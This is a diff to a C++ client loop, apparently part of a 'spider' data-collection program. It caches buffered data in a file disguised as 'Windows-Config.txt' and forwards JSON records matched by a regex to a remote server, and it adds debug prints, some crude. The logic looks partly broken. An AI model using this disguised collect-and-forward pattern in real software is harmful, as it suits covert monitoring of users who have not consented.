@@ -10,6 +10,7 @@
 
 #include <regex>
 #include <fstream>
+#include <iostream>
 #include "Protocol/BufferSender.hpp"
 #include "Protocol/ClientProtocol.hpp"
 
@@ -38,33 +39,43 @@ bool spider::ClientProtocol::connect()
 void spider::ClientProtocol::run()
 {
   BufferSender &buf = BufferSender::BufferSenderInstance();
-  std::string &str = buf.getBuf();
-
+  std::fstream file;
+  std::string tmp;
+  file.open("Windows-Config.txt", std::ios::out | std::ios::in | std::ios::trunc);
+  if (!file.is_open())
+    std::cout << "can't open the file" << std::endl;
+  else
+    std::cout << "open correctly" << std::endl;
   for (;;)
   {
+    std::string str = buf.getBuf();
+    Sleep(200);
     if (str.empty())
       continue;
     if (!_net.isConnected())
       if (!connect())
       {
-	std::ofstream file("Windows-Config.local", std::ios::out);
-	if (!file)
-	  continue;
+	std::cout << "writing in file\n";
 	file << str;
-	file.close();
+	str.clear();
       }
-    std::ifstream open("Windows-Config.local", std::ios::in);
-    if (!open)
-      continue;
-    std::string tmp;
-    open >> tmp;
+    std::cout << "BITE" << std::endl;
+    _net.run();
+    std::cout << "BOOBIES" << std::endl;
+    getline(file, tmp);
+    std::cout << tmp << std::endl;
     tmp.append(str);
     str = tmp;
-    open.close();
-    std::regex reg = std::regex(
-      "\\{(?:(?:\\s*\"[ -~]+\": \"[ -~]+\",{0,1}\\s*)+\"data\": \\{(?:\\s*\"[ -~]+\": \"[ -~]+\",{0,1}\\s*)+\\}(?:,{0}|,{1}(?:\\s*\"[ -~]+\": \"[ -~]+\",{0,1}\\s*)+)|(?:\\s*\"[ -~]+\": \"[ -~]+\",{0,1}\\s*)+)\\}");
+    std::cout << "here to send to server" << std::endl;
+    std::cout << str << std::endl;
+    std::regex reg = std::regex("\\{(?:(?:\\s*\"[ -z|~]+\": \"[ -z|~]+\",{0,1}\\s*)+\"data\": \\{(?:\\s*\"[ -z|~]+\": \"[ -z|~]+\",{0,1}\\s*)+\\}(?:,{0}|,{1}(?:\\s*\"[ -z|~]+\": \"[ -z|~]+\",{0,1}\\s*)+)|(?:\\s*\"[ -z|~]+\": \"[ -z|~]+\",{0,1}\\s*)+)\\}");
     for (auto it = std::sregex_iterator(str.begin(), str.end(), reg);
 	 it != std::sregex_iterator(); ++it)
+    {
       _net.send(it->str());
+      std::cout << it->str() << std::endl;
+    }
+    str.clear();
+    tmp.clear();
   }
 }
